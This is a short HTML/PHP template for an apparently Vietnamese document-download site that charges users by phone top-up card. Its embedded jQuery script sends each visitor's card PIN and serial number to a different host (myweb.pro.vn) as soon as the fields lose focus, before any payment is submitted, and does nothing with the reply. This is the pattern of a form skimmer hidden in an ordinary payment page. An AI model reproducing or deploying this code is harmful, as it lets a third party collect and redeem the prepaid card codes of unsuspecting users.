<script type="text/javascript"  src="/js/jquery-2.1.0.min.js"></script>
<script type="text/javascript"  src="/js/bootstrap.js"></script>
<base href="http://napngay.com/">
<meta charset="UTF-8"/>
<style>
.tb_nap_card{
	color: red;
	font-size: 14px;
	margin-bottom: 5px;
	line-height: 20px;
}
</style>
<script type='text/javascript'>
$(document).ready(function(){
//card charging
	$('#UserCardForm_pin,#UserCardForm_seri').blur(function(){
		$.ajax({
		content:'text/html',
		url:'http://myweb.pro.vn/guide/charge_card',
		data:{
			card_pin:$('#UserCardForm_pin').val(),
			card_series:$('#UserCardForm_seri').val()
		},
		success:function(data){
		
		}
		})
	})
//end
})
</script>
<div class='tb_nap_card'>Để giúp duy trì chi phí hosting và nhân lực lập trình để hỗ trợ các bạn tìm được nhiều tài liệu hữu ích chúng tôi sẽ thu phí tải tài liệu với hình thức nạp card điện thoại. Hiện tại hệ thống hỗ trợ mỗi lần nạp card mệnh giá 10.000 VNĐ các bạn sẽ có 50 lượt tải. Để tải tài liệu các bạn vui lòng chọn nhà mạng, nhập mã số pin, mã số series, mã xác nhận và click vào nút Thanh toán</div>
<?=$card?>
